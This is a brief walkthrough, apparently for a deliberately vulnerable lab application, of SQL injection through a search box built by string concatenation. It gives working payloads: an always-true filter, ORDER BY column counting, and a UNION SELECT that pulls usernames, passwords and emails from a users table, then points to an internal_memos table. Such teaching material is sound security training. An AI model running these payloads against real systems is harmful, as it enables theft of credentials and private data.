How the injection works here

  1. In vulnerable mode, the search box is dropped straight into WHERE name LIKE '%…%' with plain string concatenation.
  2. Try ' OR '1'='1' -- to return every row regardless of the filter.
  3. Find the column count with ' ORDER BY 6-- (bump the number until it errors).
  4. Once you know the count, pull data from another table: ' UNION SELECT id, username, password, email, role, 1 FROM users--
  5. Go one layer deeper — the internal_memos table has the same column shape as users. See if you can reach it.
